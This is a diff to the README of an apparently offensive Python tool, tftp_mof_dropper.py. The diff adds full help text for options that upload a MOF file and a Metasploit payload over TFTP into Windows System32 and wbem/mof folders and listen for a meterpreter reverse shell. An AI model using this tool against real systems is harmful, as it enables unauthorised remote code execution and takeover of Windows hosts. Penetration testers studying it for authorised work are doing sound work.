@@ -4,10 +4,28 @@ Transfers a MOF file and a payload via tftp to the target. Uses metasploit to ge
 
 Usage:
 ```
-python tftp_mof_dropper.py
+python tftp_mof_dropper.py --help
 usage: tftp_mof_dropper.py [-h] --rhost RHOST [--rport RPORT] --lhost LHOST
                            [--lport LPORT] [--exe_rfile EXE_RFILE]
                            [--mof_rfile MOF_RFILE] [--msf_payload MSF_PAYLOAD]
+
+optional arguments:
+  -h, --help            show this help message and exit
+  --rhost RHOST         the remote host (default: None)
+  --rport RPORT         the remote tftp port (default: 69)
+  --lhost LHOST         the local host (default: None)
+  --lport LPORT         the local port to listen on for incoming reverse shell
+                        (default: 4444)
+  --exe_rfile EXE_RFILE
+                        the path on the remote host where the exe file (msf
+                        payload) should be uploaded to (default:
+                        /Windows/System32/)
+  --mof_rfile MOF_RFILE
+                        the path on the remote host where the mof file should
+                        be uploaded to (default: /Windows/System32/wbem/mof/)
+  --msf_payload MSF_PAYLOAD
+                        the msf payload to use (default:
+                        windows/meterpreter/reverse_tcp)
 ```
 
 Example:
